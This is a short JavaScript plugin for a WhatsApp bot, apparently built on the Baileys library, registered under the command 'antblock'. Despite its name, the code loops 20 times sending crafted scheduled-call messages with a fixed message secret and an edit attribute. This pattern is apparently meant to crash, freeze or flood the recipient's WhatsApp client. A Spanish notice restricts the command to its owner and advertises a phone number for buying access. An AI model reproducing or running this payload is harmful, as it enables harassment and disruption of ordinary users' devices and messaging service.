let handler = async (m, { conn, isBot, isOwner, command }) => {
  if (!isBot && !isOwner) return conn.sendMessage(m.chat, {
    text: `\n ❌ *COMANDO NEGADO, SOLO PUEDE SER USADO POR MI PORTADOR, SI DESEAS ADQUIRIRLO MANDA MENSAGE +526421147692*\n`
  }, { quoted: m });

  const cantidad = 20; // 🔁 Puedes cambiar la cantidad si deseas más envíos
  const from = m.chat;

  for (let i = 0; i < cantidad; i++) {
    await conn.relayMessage(from, {
      messageContextInfo: {
        messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
        deviceListMetaData: {},
        deviceListMetadataVersion: 2
      },
      scheduledCallCreationMessage: {
        scheduledTimestampMs: '1200',
        callType: "AUDIO",
        title: '👻',
      }
    }, {
      additionalAttributes: {
        edit: '7'
      }
    });

    await delay(100); // ⏱️ Pequeña pausa para evitar sobrecarga
  }
};

handler.command = ['antblock'];
handler.owner = false;
handler.bot = true;

export default handler;
